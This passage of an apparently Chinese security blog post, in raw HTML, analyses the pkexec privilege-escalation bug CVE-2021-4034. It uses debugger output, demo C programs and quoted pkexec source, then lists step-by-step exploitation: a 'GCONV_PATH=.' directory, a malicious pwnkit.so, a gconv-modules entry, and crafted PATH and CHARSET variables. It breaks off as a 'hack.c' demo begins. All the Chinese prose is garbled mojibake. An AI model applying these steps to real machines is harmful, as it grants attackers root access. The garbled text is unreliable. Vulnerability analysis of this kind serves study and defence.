gconv-modules.</p>\n</blockquote>\n<ul>\n<li><code>iconv</code>  è½¬æ¢å­—ç¬¦é›†</li>\n<li><code>iconv</code>  æ˜¯åœ¨ä¸€ä¸ªåŠ¨æ€åº“ <code>gconv module</code></li>\n<li>åŠ¨æ€åº“ <code>gconv module</code>  å®šä¹‰åœ¨é…ç½®æ–‡ä»¶å¤¹ <code>gconv-modules</code>  é‡Œ</li>\n<li>ä¼šè°ƒç”¨è¿™ä¸ªæ–‡ä»¶å¤¹ <code>gconv-modules</code>  ä¸‹çš„ <code>so</code>  æ–‡ä»¶ä¸­çš„ <code>gconv()</code>  å’Œ <code>gconv_init()</code></li>\n</ul>\n<p>The default  <code>gconv module</code>  and  <code>gconv module configuration</code>  file was located in:</p>\n<ul>\n<li>/usr/lib/gconv: Usual default gconv module path.</li>\n<li>/usr/lib/gconv/gconv-modules: Usual system default gconv module configuration file.</li>\n<li>/usr/lib/gconv/gconv-modules.cache: Usual system gconv module configuration cache</li>\n</ul>\n<p>å¯ä»¥çœ‹çœ‹ iconv çš„ help</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">squ@squ-virtual-machine:~/Desktop/cve/CVE-2021-4034/poc$ iconv --help</span><br><span class=\"line\">Usage: iconv [OPTION...] [FILE...]</span><br><span class=\"line\">Convert encoding of given files from one encoding to another.</span><br><span class=\"line\"></span><br><span class=\"line\"> Input/Output format specification:</span><br><span class=\"line\">  -f, --from-code=NAME       encoding of original text</span><br><span class=\"line\">  -t, --to-code=NAME         encoding for output</span><br><span class=\"line\"></span><br><span class=\"line\"> Information:</span><br><span class=\"line\">  -l, --list                 list all known coded character sets</span><br><span class=\"line\"></span><br><span class=\"line\"> Output control:</span><br><span class=\"line\">  -c                         omit invalid characters from output</span><br><span class=\"line\">  -o, --output=FILE          output file</span><br><span class=\"line\">  -s, --silent               suppress warnings</span><br><span class=\"line\">      --verbose              print progress information</span><br><span class=\"line\"></span><br><span class=\"line\">  -?, --help                 Give this help list</span><br><span class=\"line\">      --usage                Give a short usage message</span><br><span class=\"line\">  -V, --version              Print program version</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>ä½¿ç”¨</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">iconv -f UTF-8 -t UTF-16 &lt; input file &gt; output file</span><br></pre></td></tr></table></figure>\n<p><code>iconv</code>  ä¼šè°ƒç”¨ <code>iconv_open()</code>  è€Œ <code>iconv_open()</code>  ä¾èµ–ç¯å¢ƒå˜é‡ <code>GCONV_PATH</code></p>\n<blockquote>\n<p>The iconv support extension the charset conversion ability by user defined gconv module. When use iconv or call iconv() function, it must first allocate a conversion descriptor using <a href=\"https://man7.org/linux/man-pages/man3/iconv_open.3.html\">iconv_open()</a>. The operation of this function will influence by the enviroment GCONV_PATH</p>\n</blockquote>\n<p><em><strong>æ­¤å¤„åº”è¯¥æœ‰æºç ï¼Œä¹‹åè¡¥</strong></em><br>\nç”¨ <code>GCONV_PATH</code>  æŒ‡å®šè‡ªå®šä¹‰æ¨¡å—å»æ›¿æ¢ç³»ç»Ÿæ¨¡å—<br>\næ‰€ä»¥åˆ©ç”¨æ–¹æ³•å¦‚ä¸‹</p>\n<blockquote>\n<p>Suppose we can control the content of enviroment GCONV_PATH, provide a gconv module configuration file and gconv module with evil code. The evil code may be execute for some case.</p>\n</blockquote>\n<p><a href=\"https://www.gnu.org/software/libc/manual/html_node/glibc-iconv-Implementation.html#6.5.4.1%20Format%20of%20gconv-modules%20files\">gconv æ ¼å¼</a></p>\n<h3 id=\"å…³äºargvå’Œenviron\"><a class=\"markdownIt-Anchor\" href=\"#å…³äºargvå’Œenviron\">#</a> å…³äº argv å’Œ environ</h3>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">pwndbg&gt; </span><span class=\"language-bash\">environ</span></span><br><span class=\"line\">00:0000â”‚ rdx 0x7fffffffe018 â€”â–¸ 0x7fffffffe374 â—‚â€” &#x27;SHELL=/bin/bash&#x27;</span><br><span class=\"line\">01:0008â”‚     0x7fffffffe020 â€”â–¸ 0x7fffffffe384 â—‚â€” &#x27;SESSION_MANAGER=local/squ-virtual-machine:@/tmp/.ICE-unix/1566,unix/squ-virtual-machine:/tmp/.ICE-unix/1566&#x27;</span><br><span class=\"line\">02:0010â”‚     0x7fffffffe028 â€”â–¸ 0x7fffffffe3f0 â—‚â€” &#x27;QT_ACCESSIBILITY=1&#x27;</span><br><span class=\"line\">03:0018â”‚     0x7fffffffe030 â€”â–¸ 0x7fffffffe403 â—‚â€” &#x27;COLORTERM=truecolor&#x27;</span><br><span class=\"line\">04:0020â”‚     0x7fffffffe038 â€”â–¸ 0x7fffffffe417 â—‚â€” &#x27;XDG_CONFIG_DIRS=/etc/xdg/xdg-ubuntu:/etc/xdg&#x27;</span><br><span class=\"line\">05:0028â”‚     0x7fffffffe040 â€”â–¸ 0x7fffffffe444 â—‚â€” &#x27;XDG_MENU_PREFIX=gnome-&#x27;</span><br><span class=\"line\">06:0030â”‚     0x7fffffffe048 â€”â–¸ 0x7fffffffe45b â—‚â€” &#x27;GNOME_DESKTOP_SESSION_ID=this-is-deprecated&#x27;</span><br><span class=\"line\">07:0038â”‚     0x7fffffffe050 â€”â–¸ 0x7fffffffe487 â—‚â€” &#x27;LC_ADDRESS=zh_CN.UTF-8&#x27;</span><br><span class=\"line\">08:0040â”‚     0x7fffffffe058 â€”â–¸ 0x7fffffffe49e â—‚â€” &#x27;GNOME_SHELL_SESSION_MODE=ubuntu&#x27;</span><br><span class=\"line\">09:0048â”‚     0x7fffffffe060 â€”â–¸ 0x7fffffffe4be â—‚â€” &#x27;LC_NAME=zh_CN.UTF-8&#x27;</span><br><span class=\"line\">0a:0050â”‚     0x7fffffffe068 â€”â–¸ 0x7fffffffe4d2 â—‚â€” &#x27;SSH_AUTH_SOCK=/run/user/1000/keyring/ssh&#x27;</span><br><span class=\"line\">0b:0058â”‚     0x7fffffffe070 â€”â–¸ 0x7fffffffe4fb â—‚â€” &#x27;XMODIFIERS=@im=ibus&#x27;</span><br><span class=\"line\">0c:0060â”‚     0x7fffffffe078 â€”â–¸ 0x7fffffffe50f â—‚â€” &#x27;DESKTOP_SESSION=ubuntu&#x27;</span><br><span class=\"line\">0d:0068â”‚     0x7fffffffe080 â€”â–¸ 0x7fffffffe526 â—‚â€” &#x27;LC_MONETARY=zh_CN.UTF-8&#x27;</span><br><span class=\"line\">0e:0070â”‚     0x7fffffffe088 â€”â–¸ 0x7fffffffe53e â—‚â€” &#x27;SSH_AGENT_PID=1528&#x27;</span><br><span class=\"line\">0f:0078â”‚     0x7fffffffe090 â€”â–¸ 0x7fffffffe551 â—‚â€” &#x27;GTK_MODULES=gail:atk-bridge&#x27;</span><br><span class=\"line\">10:0080â”‚     0x7fffffffe098 â€”â–¸ 0x7fffffffe56d â—‚â€” &#x27;PWD=/home/squ/Desktop&#x27;</span><br><span class=\"line\">11:0088â”‚     0x7fffffffe0a0 â€”â–¸ 0x7fffffffe583 â—‚â€” &#x27;XDG_SESSION_DESKTOP=ubuntu&#x27;</span><br><span class=\"line\">-------------------------------------------------------------------------------</span><br><span class=\"line\"><span class=\"meta prompt_\">pwndbg&gt; </span><span class=\"language-bash\">argv</span></span><br><span class=\"line\">00:0000â”‚ rsi 0x7fffffffe008 â€”â–¸ 0x7fffffffe35c â—‚â€” &#x27;/home/squ/Desktop/a.out&#x27;</span><br><span class=\"line\">01:0008â”‚     0x7fffffffe010 â—‚â€” 0x0</span><br></pre></td></tr></table></figure>\n<p><code>argv</code>  çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯è‡ªå·±çš„ç»å¯¹è·¯å¾„ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯ <code>NULL</code></p>\n<h4 id=\"execvec\"><a class=\"markdownIt-Anchor\" href=\"#execvec\">#</a> execve.c</h4>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"type\">char</span>* <span class=\"type\">const</span> argv[] = &#123;</span><br><span class=\"line\">        <span class=\"string\">&quot;AAAA1111&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;BBBB2222&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;CCCC3333&quot;</span>,</span><br><span class=\"line\">        <span class=\"literal\">NULL</span></span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">    <span class=\"type\">char</span>* <span class=\"type\">const</span> envp[] = &#123;</span><br><span class=\"line\">        <span class=\"string\">&quot;DDDD3333&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;EEEE4444&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;FFFF5555&quot;</span>,</span><br><span class=\"line\">        <span class=\"literal\">NULL</span></span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">execve</span>(<span class=\"string\">&quot;./test&quot;</span>, argv, envp);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"testc\"><a class=\"markdownIt-Anchor\" href=\"#testc\">#</a> test.c</h4>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span>** argv)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;argc: %d\\n&quot;</span>, argc);</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"type\">int</span> i; i&lt;<span class=\"number\">8</span>; i++) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(argv[i]!=<span class=\"literal\">NULL</span>) &#123;</span><br><span class=\"line\">            <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;argv[%d]: %s\\n&quot;</span>, i, argv[i]);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;argv[%d]: NULL\\n&quot;</span>, i);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"ç»“æœ\"><a class=\"markdownIt-Anchor\" href=\"#ç»“æœ\">#</a> ç»“æœ</h4>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">squ@squ-<span class=\"keyword\">virtual</span>-machine:~/Desktop$ ./execve </span><br><span class=\"line\">argc: <span class=\"number\">3</span></span><br><span class=\"line\">argv[<span class=\"number\">0</span>]: AAAA1111</span><br><span class=\"line\">argv[<span class=\"number\">1</span>]: BBBB2222</span><br><span class=\"line\">argv[<span class=\"number\">2</span>]: CCCC3333</span><br><span class=\"line\">argv[<span class=\"number\">3</span>]: <span class=\"literal\">NULL</span></span><br><span class=\"line\">argv[<span class=\"number\">4</span>]: DDDD3333</span><br><span class=\"line\">argv[<span class=\"number\">5</span>]: EEEE4444</span><br><span class=\"line\">argv[<span class=\"number\">6</span>]: FFFF5555</span><br><span class=\"line\">argv[<span class=\"number\">7</span>]: <span class=\"literal\">NULL</span></span><br></pre></td></tr></table></figure>\n<p>argc æ˜¯è‡ªåŠ¨è®¡ç®—çš„</p>\n<h4 id=\"agrvä¸ä¼ å…¥çš„æƒ…å†µ\"><a class=\"markdownIt-Anchor\" href=\"#agrvä¸ä¼ å…¥çš„æƒ…å†µ\">#</a> agrv ä¸ä¼ å…¥çš„æƒ…å†µï¼Ÿ</h4>\n<p>ä¿®æ”¹ä¸º <code>char* const argv[] = &#123;NULL&#125;</code> <br>\n å°±æ²¡æœ‰ argc äº†ï¼Œè€Œ <code>argv[1]</code>  æ˜¯ <code>environ[0]</code></p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">squ@squ-<span class=\"keyword\">virtual</span>-machine:~/Desktop$ ./execve </span><br><span class=\"line\">argc: <span class=\"number\">0</span></span><br><span class=\"line\">argv[<span class=\"number\">0</span>]: <span class=\"literal\">NULL</span></span><br><span class=\"line\">argv[<span class=\"number\">1</span>]: DDDD3333</span><br><span class=\"line\">argv[<span class=\"number\">2</span>]: EEEE4444</span><br><span class=\"line\">argv[<span class=\"number\">3</span>]: FFFF5555</span><br><span class=\"line\">argv[<span class=\"number\">4</span>]: <span class=\"function\"><span class=\"literal\">NULL</span></span></span><br><span class=\"line\"><span class=\"function\">Segmentation <span class=\"title\">fault</span> <span class=\"params\">(core dumped)</span></span></span><br></pre></td></tr></table></figure>\n<h3 id=\"å…³äºè°ƒç”¨iconvçš„åŠæ³•\"><a class=\"markdownIt-Anchor\" href=\"#å…³äºè°ƒç”¨iconvçš„åŠæ³•\">#</a> å…³äºè°ƒç”¨ iconv çš„åŠæ³•</h3>\n<p>å¦‚æœåŠ«æŒäº† <code>GCONV_PATH</code>  å°±éœ€è¦è°ƒç”¨ <code>iconv()</code>  æ‰è¡Œï¼Œåœ¨ <code>pkexec.c</code>  æºç  369 è¡Œä½ç½®</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"type\">static</span> gboolean</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">validate_environment_variable</span> <span class=\"params\">(<span class=\"type\">const</span> gchar *key,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">                               <span class=\"type\">const</span> gchar *value)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  gboolean ret;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* Generally we bail if any environment variable value contains</span></span><br><span class=\"line\"><span class=\"comment\">   *</span></span><br><span class=\"line\"><span class=\"comment\">   *   - &#x27;/&#x27; characters</span></span><br><span class=\"line\"><span class=\"comment\">   *   - &#x27;%&#x27; characters</span></span><br><span class=\"line\"><span class=\"comment\">   *   - &#x27;..&#x27; substrings</span></span><br><span class=\"line\"><span class=\"comment\">   */</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">g_return_val_if_fail</span> (key != <span class=\"literal\">NULL</span>, FALSE);</span><br><span class=\"line\">  <span class=\"built_in\">g_return_val_if_fail</span> (value != <span class=\"literal\">NULL</span>, FALSE);</span><br><span class=\"line\"></span><br><span class=\"line\">  ret = FALSE;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* special case $SHELL */</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (<span class=\"built_in\">g_strcmp0</span> (key, <span class=\"string\">&quot;SHELL&quot;</span>) == <span class=\"number\">0</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"comment\">/* check if it&#x27;s in /etc/shells */</span></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (!<span class=\"built_in\">is_valid_shell</span> (value))</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          <span class=\"built_in\">log_message</span> (LOG_CRIT, TRUE,</span><br><span class=\"line\">                       <span class=\"string\">&quot;The value for the SHELL variable was not found the /etc/shells file&quot;</span>);</span><br><span class=\"line\">          <span class=\"built_in\">g_printerr</span> (<span class=\"string\">&quot;\\n&quot;</span></span><br><span class=\"line\">                      <span class=\"string\">&quot;This incident has been reported.\\n&quot;</span>);</span><br><span class=\"line\">          <span class=\"keyword\">goto</span> out;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> ((<span class=\"built_in\">g_strcmp0</span> (key, <span class=\"string\">&quot;XAUTHORITY&quot;</span>) != <span class=\"number\">0</span> &amp;&amp; <span class=\"built_in\">strstr</span> (value, <span class=\"string\">&quot;/&quot;</span>) != <span class=\"literal\">NULL</span>) ||</span><br><span class=\"line\">           <span class=\"built_in\">strstr</span> (value, <span class=\"string\">&quot;%&quot;</span>) != <span class=\"literal\">NULL</span> ||</span><br><span class=\"line\">           <span class=\"built_in\">strstr</span> (value, <span class=\"string\">&quot;..&quot;</span>) != <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"built_in\">log_message</span> (LOG_CRIT, TRUE,</span><br><span class=\"line\">                   <span class=\"string\">&quot;The value for environment variable %s contains suscipious content&quot;</span>,</span><br><span class=\"line\">                   key);</span><br><span class=\"line\">      <span class=\"built_in\">g_printerr</span> (<span class=\"string\">&quot;\\n&quot;</span></span><br><span class=\"line\">                  <span class=\"string\">&quot;This incident has been reported.\\n&quot;</span>);</span><br><span class=\"line\">      <span class=\"keyword\">goto</span> out;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  ret = TRUE;</span><br><span class=\"line\"></span><br><span class=\"line\"> out:</span><br><span class=\"line\">  <span class=\"keyword\">return</span> ret;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"built_in\">g_strcmp0</span> (key, <span class=\"string\">&quot;SHELL&quot;</span>) == <span class=\"number\">0</span>)</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"comment\">/* check if it&#x27;s in /etc/shells */</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!<span class=\"built_in\">is_valid_shell</span> (value)) <span class=\"comment\">// SHELLå€¼ä¸åˆæ³• è°ƒç”¨g_printerr</span></span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        <span class=\"built_in\">log_message</span> (LOG_CRIT, TRUE,</span><br><span class=\"line\">                     <span class=\"string\">&quot;The value for the SHELL variable was not found the /etc/shells file&quot;</span>);</span><br><span class=\"line\">        <span class=\"built_in\">g_printerr</span> (<span class=\"string\">&quot;\\n&quot;</span></span><br><span class=\"line\">                    <span class=\"string\">&quot;This incident has been reported.\\n&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">goto</span> out;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">  &#125;</span><br></pre></td></tr></table></figure>\n<p>å¦‚æœæ„é€ äº†ä¸€ä¸ªé”™è¯¯çš„ <code>SHELL</code>  ç¯å¢ƒå˜é‡ï¼Œå°±ä¼šè°ƒç”¨ <code>g_printerr</code> ï¼ˆå½“ç„¶ä¹Ÿå¯ä»¥åˆ©ç”¨ <code>XAUTHORITY</code>  æ¥æ‰“ï¼‰<br>\nè€Œ <code>g_printerr</code>  é»˜è®¤æ˜¯ <code>UTF-8</code>  æ ¼å¼ï¼Œä»–ä¼šæ£€æŸ¥ <code>CHARSET</code>  å˜é‡ï¼Œå¯¹è¾“å‡ºæ ¼å¼è¿›è¡Œè½¬ç ï¼Œå°±ä¼šè°ƒç”¨ <code>iconv</code> ï¼Œç„¶å <code>iconv</code>  ä¼šè°ƒç”¨ <code>iconv_open</code>  åˆå§‹åŒ–ï¼Œ <code>iconv_open</code>  ä¼šæ ¹æ® <code>GCONV_PATH</code>  æ‰¾åˆ° <code>gconv-modules</code>  æ–‡ä»¶ï¼Œå†æ ¹æ® <code>gconv-modules</code>  æ–‡ä»¶çš„æŒ‡ç¤ºæ‰¾åˆ°å‚æ•°å¯¹åº”å­—ç¬¦é›†çš„ so åº“ï¼Œè°ƒç”¨ so åº“ä¸­çš„ <code>gconv()</code>  å’Œ <code>gonv_init()</code>  å‡½æ•°ã€‚</p>\n<h2 id=\"åˆ©ç”¨æ–¹æ³•\"><a class=\"markdownIt-Anchor\" href=\"#åˆ©ç”¨æ–¹æ³•\">#</a> åˆ©ç”¨æ–¹æ³•</h2>\n<ol>\n<li>åˆ›å»ºä¸€ä¸ª <code>GCONV_PATH=.</code>  çš„ç›®å½•</li>\n<li>åœ¨ä¸Šé¢ç›®å½•ä¸‹åˆ›å»ºæˆ‘ä»¬çš„æ¶æ„åº“</li>\n<li>åœ¨æœ¬ç›®å½•ä¸‹åˆ›å»º <code>gconv-modules</code>  æ–‡ä»¶ï¼Œå†™å…¥ <code>module UTF-8// PWNKIT// pwnkit 1</code></li>\n<li>è®¾ç½®ç¯å¢ƒå˜é‡\n<ol>\n<li>ç¬¬ä¸€ä¸ªæ˜¯æ¶æ„åº“ <code>pwnkit.so:.</code></li>\n<li>ç¬¬äºŒä¸ªç¯å¢ƒå˜é‡  <code>PATH=GCONV_PATH=.</code>  è¿™æ ·  <code>g_find_program_in_path</code>  å‡½æ•°ç»„åˆå‡ºçš„è·¯å¾„å°±æ˜¯ <code>GCONV_PATH=./pwnkit.so:.</code>  ï¼ˆ <code>PATH</code> + <code>NAME</code> = <code>GCONV_PATH=.</code> + <code>/</code> + <code>pwnkit.so:.</code> ï¼‰</li>\n<li><code>CHARSET=PWNKIT</code> ï¼ŒæŒ‡å®šå­—ç¬¦é›†ä¸º <code>pwnkit</code></li>\n</ol>\n</li>\n</ol>\n<blockquote>\n<p>å¦‚ç¯å¢ƒå˜é‡ â€œPATH=nameâ€ï¼Œå¦‚æœ name ç›®å½•å­˜åœ¨ï¼Œå¹¶ä¸” name ç›®å½•ä¸‹ä¹Ÿæœ‰ value å¯æ‰§è¡Œç¨‹åºï¼Œé‚£ä¹ˆ envp [0] çš„ä¾¿æŒ‡å‘ name/valueï¼›<br>\nå¦‚ç¯å¢ƒå˜é‡è®¾ç½®ä¸º â€œPATH=name=.â€ï¼Œå¹¶ä¸” â€œname=.â€ ç›®å½•ä¸‹ä¹Ÿæœ‰ value å¯æ‰§è¡Œç¨‹åºï¼Œé‚£ä¹ˆ envp [0] çš„ä¾¿æŒ‡å‘ â€œname=./valueâ€ã€‚</p>\n</blockquote>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (argv[n] != <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  argv[n] = path;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>å¯¹ç¯å¢ƒå˜é‡çš„å›å†™</p>\n<h3 id=\"æµç¨‹\"><a class=\"markdownIt-Anchor\" href=\"#æµç¨‹\">#</a> æµç¨‹</h3>\n<ol>\n<li>execve æ‰§è¡Œ pkexecï¼Œæ— å‚ä¼ å…¥ï¼Œé€ æˆè¶Šç•Œé”™è¯¯æ‰§è¡Œ <code>environ[0]</code></li>\n<li>612 è¡Œ argv [1] è¶Šç•Œè®¿é—®çš„æ˜¯ envp [0]ï¼Œè·å–åˆ° value å€¼ï¼Œå’Œ path ç»„åˆåå†™å›ï¼›ï¼ˆå®ç°äº†ä¸€æ¬¡æ‰¾åˆ°è·¯å¾„çš„å†™å…¥ï¼‰æ­¤æ—¶ <code>GCONV_PATH</code>  å·²ç»è¢«ç¯¡æ”¹</li>\n<li>æ£€æµ‹åˆ° <code>SHELL</code>  å˜é‡é—®é¢˜ï¼Œè°ƒç”¨ <code>g_printerr</code></li>\n<li>æ ¹æ® <code>CHARSET</code>  å˜é‡ï¼Œéœ€è¦è½¬ç ï¼Œè°ƒç”¨ <code>iconv</code> ï¼Œç„¶å <code>iconv_open</code></li>\n<li>æ ¹æ® <code>GCONV_PATH</code>  æ‰¾åˆ° <code>gconv-modules</code> , ç„¶åæ‰¾åˆ°æˆ‘ä»¬çš„æ¶æ„åº“</li>\n<li>è°ƒç”¨å‡½æ•° <code>gonv_init()</code> , ææƒæ‹¿ä¸‹ï¼</li>\n</ol>\n<h2 id=\"gconv_pathæ¼æ´demo\"><a class=\"markdownIt-Anchor\" href=\"#gconv_pathæ¼æ´demo\">#</a> GCONV_PATH æ¼æ´ demo</h2>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// file name hack.c</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span 